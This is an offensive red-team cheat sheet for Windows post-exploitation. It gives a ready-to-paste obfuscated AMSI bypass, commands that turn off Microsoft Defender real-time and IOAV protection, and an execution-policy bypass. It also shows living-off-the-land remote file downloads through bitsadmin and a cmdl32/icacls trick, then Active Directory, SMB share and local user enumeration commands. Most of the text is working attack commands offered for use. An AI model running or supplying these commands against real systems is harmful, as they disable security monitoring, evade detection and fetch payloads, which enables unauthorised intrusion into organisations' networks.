# RedTeam-CheatSheet From a Windows Host

---

- [CheckLists](#checklists)
  - [Mandatory](#disable-logging-and-enable-bypasses)
  - [Local Privilege Escalation](#privilege-escalation)
  - [Domain Enumeration](#domain-enumeration)
- [Commands](#commands)
  - [Bypass PowerShell Logging](#bypass-logging)
- [Living off the land](#living-off-the-land)
  - [Active Directory Built in Commands](#ad-enumeration)

---

# Checklists  
## Disable Logging and Enable Bypasses
> 1. [ ] Bypass logging - Invisishell 
> 2. [ ] Bypass PowerShell AMSI on every new user
> 3. [ ] Bypass Defender (with Admin privs)
> 4. [ ] .NET AMSI bypass (when required)

## Privilege Escalation
> 1. [ ] PowerUp.ps1

## Domain Enumeration
> 1. [ ] Domains, Forests, Trusts, SIDS
> 2. [ ] Users, fake accounts (password or logon count checks)
> 3. [ ] Domain computers
> 4. [ ] Kerberos Policy Information
> 5. [ ] GPO && OU
> 6. [ ] ACL's 
> 7. [ ] Blood-hound
> 8. [ ] SPN

--- 
# Commands  
## Bypass Logging
### Bypass Execution Policy
`powershell -ep bypass`

### Bypass AMSI 
https://amsi.fail/
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### Bypass Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

--- 
## Living off the Land
https://lolbas-project.github.io/#  
### Download Remote File Bypass Examples
#### Bitsadmin
`bitsadmin /transfer "import" https://<URL> C:\Users\<user>\output.txt`
#### cmdl32
1. Create a file '_settings.txt_'
```
[Connection Manager]
CMSFile=settings.txt >> settings.txt
ServiceName=WindowsUpdate >> settings.txt
TunnelFile=settings.txt >> settings.txt
[Settings] >> settings.txt
UpdateUrl=<URL of Remote File>
```
2. Run the following commands to download remote file

```
icacls %cd /deny %username%:(OI)(CI)(DE,DC)
set tmp=%cd%
cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
```
3. Remove icacls
`icacls %cd% /remove:d %username%`

## AD Enumeration
### Domain Controllers
```
# Password Policies
Get-ADDefaultDomainPasswordPolicy
# List DC's
Get-ADDomainController -filter * | select Name, IPv4Address
```
### Organizational Units and Device Searches
```
# Organizational Units (OU's)
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishableName -A

# Get Computers within the OU's
Get-ADComputer -SearchBase "<OU-String>" -Filter * | Select-Object -ExpandProperty Name
```
### File Shares 
```
# Store devices in an OU into $FileServAD
$FileServAD = Get-ADComputer -SearchBase "OU=Servers,DC=corp,dc=ad" -Filter * | Select-Object -ExpandProperty Name

# Get SMB Shares on all the devices
Invoke-Command -ComputerName $FileServAD -ScriptBlock {Get-SmbShare -Special $false}
```

---
## Local
### Host Information
```
# System Info
sysinfo

#Networking
ipconfig /all
hostname
```

### Users and Groups
```
net users
net user <username>
net localgroups
net localgroup Administrators
```
